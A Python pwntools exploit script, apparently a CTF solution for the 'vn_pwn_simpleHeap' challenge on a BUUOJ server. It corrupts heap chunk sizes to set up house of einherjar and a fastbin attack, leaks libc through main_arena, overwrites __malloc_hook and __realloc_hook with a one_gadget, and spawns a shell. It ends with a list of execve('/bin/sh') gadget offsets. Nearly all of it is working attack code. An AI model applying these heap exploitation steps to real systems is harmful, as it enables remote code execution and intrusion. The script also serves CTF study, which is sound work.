#!/usr/bin/env python
#-*- coding:utf-8 -*-
# Author: I0gan

from pwn import *
#from LibcSearcher import LibcSearcher

context.log_level='debug'
#context.terminal = ['konsole', '-x', 'bash', 'c']
#context.terminal = 'konsole'
#context(arch = 'i386', os = 'linux', log_level='debug')
#context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile = './vn_pwn_simpleHeap'
libFile = '/lib/x86_64-linux-gnu/libc.so.6'

remoteIp = "node3.buuoj.cn"
remotePort = 26733

LOCAL = 0
LIB   = 1

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li    = lambda x : log.info(x)
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------
def ad(size, data):
	sla('choice: ', str(1))
	sla('?', str(size))
	sa(':', data)

def rm(idx):
	sla('choice: ', str(4))
	sla('?', str(idx))

def md(idx, data):
	sla('choice: ', str(2))
	sla('?', str(idx))
	sla(':', data)

def dp(idx):
	sla('choice: ', str(3))
	sla('?', str(idx))

def q():
	sla(':', str(5))	

#--------------------------Exploit--------------------------
def exploit():
	ad(0x68, 'A') # idx 0 heap

	ad(0x48, 'C') # idx 1 emerge top
	ad(0x48, 'D') # idx 2 for overlap
	ad(0x68, 'E') # idx 3 for fastbin attack
	ad(0x68, 'F') # idx 4 for house of einherjar

	ad(0x68, 'G') # idx 5 for not emerge to top chunk
	ad(0x68, 'G') # idx 6 for not emerge to top chunk
	
	# modify fastbin size as small bin size
	# Note: size must be aliened
	p = 'A' * 0x60
	p += p64(0x0)
	p += '\xa1'
	md(0, p)
	rm(1)

	# house of eiherjar
	p = 'B' * 0x60
	p += p64(0x180 -0x70)
	p += '\xe0'
	md(3, p)

	rm(3) # for fastbin attack
	rm(4) # emrge heap

	# unsorted bin split
	ad(0x48, 'A')
	dp(2)

	main_arena = u64(ru('\x7f')[-5:] + '\x7f\x00\x00') - 0x58
	li('main_arena ' + hex(main_arena))
	lib.address = main_arena - 0x3c4b20
	li('libc_base ' + hex(lib.address))


	p = 'A' * 0x40
	p += p64(0)
	p += p64(0x71) # must be 71, or will check fail, because bin size as 70
	p += p64(main_arena - 0x33)
	ad(0x58, p)

	ad(0x68, 'A') # for ajust

	# modify malloc_hook and realloc_hook
	gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
	one_gadget = lib.address + gadget[1]
	p = '\x00' * (0x13 - 8)
	p += p64(one_gadget)
	p += p64(lib.sym['realloc'] + 12)
	ad(0x68, p)

	# get shell
	sla('choice: ', str(1))
	sla('?', str(10))
	#db()


def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		if LIB:
			lib = ELF(libFile)
			io = exe.process(env = {"LD_PRELOAD" : libFile})
		else:
			io = exe.process()
	
	else:
		exe = ELF(exeFile)
		io = remote(remoteIp, remotePort)
		if LIB:
			lib = ELF(libFile)
	
	exploit()
	finish()
'''
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
[rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
[rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
[rsp+0x70] == NULL
'''
